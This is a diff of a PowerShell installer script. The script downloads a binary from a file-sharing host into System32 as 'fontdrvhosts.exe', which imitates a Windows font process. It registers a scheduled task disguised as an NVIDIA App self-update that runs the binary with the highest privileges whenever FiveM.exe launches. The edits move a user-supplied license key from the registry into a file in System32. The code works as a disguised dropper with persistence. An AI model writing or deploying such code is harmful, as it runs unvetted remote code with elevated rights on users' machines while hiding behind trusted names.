@@ -21,7 +21,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
-$databasePath = Join-Path $system32Path "database.txt"
+$databasePath  = Join-Path $system32Path "database.txt"
 $exeUrl        = "https://files.catbox.moe/so5dwd.bin"
 $taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
@@ -31,23 +31,12 @@ $taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 if ($choice -eq "1") {
     Write-Host "Starting installation..."
 
-   
+    # Download exe
     Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 
-    
+    # Request license key and save
     $key = Read-Host "Enter License Key"
-
-    
-    $regPath = "HKCU:\Software\NVIDIAApp"
-    $regName = "LicenseKey"
-
-   
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-
-    
-    Set-ItemProperty -Path $regPath -Name $regName -Value $key
+    Set-Content -Path $databasePath -Value $key
 
     # Create scheduled task
     $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /rl HIGHEST /f'
